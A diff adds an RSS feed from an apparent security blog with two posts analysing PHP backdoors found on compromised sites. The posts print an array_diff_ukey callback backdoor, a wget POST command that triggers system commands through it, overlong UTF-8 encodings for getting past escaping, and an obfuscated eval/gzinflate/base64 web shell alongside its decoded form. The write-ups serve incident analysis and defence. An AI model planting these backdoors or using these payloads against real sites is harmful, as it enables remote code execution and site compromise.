@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Php on Greyhat.dk</title>
+    <link>https://www.greyhat.dk/tags/php/</link>
+    <description>Recent content in Php on Greyhat.dk</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 10 May 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://www.greyhat.dk/tags/php/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>PHP callback function backdoor</title>
+      <link>https://www.greyhat.dk/php-callback-function-backdoor/</link>
+      <pubDate>Sat, 10 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.greyhat.dk/php-callback-function-backdoor/</guid>
+      <description>&lt;p&gt;I recently had an incident at a customers website where the site was
+compromised. The customer went through the code and found several SQL
+injections, XSS and newly added files with backdoors (basic evals in
+PHP). All vulnerabilities was fixed (According to the customer) but
+about a month later the site was compromised again. Unfortunately no
+version control was used so we had to go through all files to help the
+customer and the log had no indications of successful attempts.&lt;/p&gt;
+
+&lt;p&gt;In several files I found code like this&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    @array_diff_ukey(@array((string)$_REQUEST[&#39;list&#39;]=&amp;gt;1), @array((string)stripslashes($_REQUEST[&#39;list2&#39;])=&amp;gt;2),$_REQUEST[&#39;var&#39;]);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It took me a while to fully understand what this is. This is a quite
+clever backdoor and the reason why its was not detected in apaches log
+is that POST was used to execute the command for compromising.&lt;/p&gt;
+
+&lt;p&gt;So in order to execute a command on the system all the attacker had to
+  do was&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ wget -S -O - --post-data &#39;var=system&amp;amp;list=ls&#39; http://example.com/g.php --2014-05-10 14:23:45-- http://example.com/g.php Resolving example.com... 127.0.0.1 Connecting to example.com|127.0.0.1|:80... connected. HTTP request sent, awaiting response... HTTP/1.1 200 OK Date: Sat, 10 May 2014 12:23:45 GMT Server: Apache Connection: close Content-Type: text/html Length: unspecified [text/html] Saving to: &#39;STDOUT&#39; 
+    [&amp;lt;=&amp;gt; ] 0 --.-K/s
+    cv.pdf
+    g.php
+    index.html
+    index5.html
+    [ &amp;lt;=&amp;gt; ] 79 --.-K/s in 0s
+    2014-05-10 14:23:45 (428 KB/s) - written to stdout [79]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nice directory listing :) I&amp;rsquo;m pretty sure you can find alternative ways
+to use this then listing files. But since the customer did not find this
+backdoor using a review it really proves a few things.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Always use version control on your software (Subversion, Git etc)&lt;/li&gt;
+&lt;li&gt;Always sanitize input&lt;/li&gt;
+&lt;li&gt;Hire developers who knows the current languages pitfalls, know how to
+review code.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Another thing I found was a heavy usage of the php function
+mysql_real_escape_string. The function does not provide any real
+security since it does not handle overlong UTF-8 chars.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    &#39; = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7 
+    &amp;quot; = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2 
+    &amp;lt; = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
+    ; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb 
+    &amp;amp; = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6 
+    \0= % 00 = %c0%80 = %e0%80%80 = %f0%80%80%80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP backdoor</title>
+      <link>https://www.greyhat.dk/php-backdoor/</link>
+      <pubDate>Sat, 23 Feb 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.greyhat.dk/php-backdoor/</guid>
+      <description>&lt;p&gt;Found this little thing on FB tonight.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    &amp;lt;?php eval(gzinflate(base64_decode(&amp;quot;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&amp;quot;))); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After unrolling the endless loops it turns out to be&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    &amp;lt;? @error_reporting(0); @ini_set(&amp;quot;display_errors&amp;quot;,0); @ini_set(&amp;quot;log_errors&amp;quot;,0); @ini_set(&amp;quot;error_log&amp;quot;,0); if (isset($_GET[&#39;r&#39;])) { print $_GET[&#39;r&#39;]; } elseif (isset($_POST[&#39;e&#39;])) { print(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST[&#39;e&#39;])))))); } elseif (isset($_SERVER[&#39;HTTP_CONTENT_ENCODING&#39;]) &amp;amp;&amp;amp; $_SERVER[&#39;HTTP_CONTENT_ENCODING&#39;] == &#39;binary&#39;) { $data = file_get_contents(&#39;php://input&#39;); if (strlen($data) &amp;gt; 0) print &#39;STATUS-IMPORT-OK&#39;; if (strlen($data) &amp;gt; 12) { $fp=@fopen(&#39;tmpfile&#39;,&#39;a&#39;); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER[&#39;REMOTE_ADDR&#39;].&amp;quot;\t&amp;quot;.base64_encode($data).&amp;quot;\r\n&amp;quot;); @flock($fp, LOCK_UN); @fclose($fp); } } exit;?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;a backdoor&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
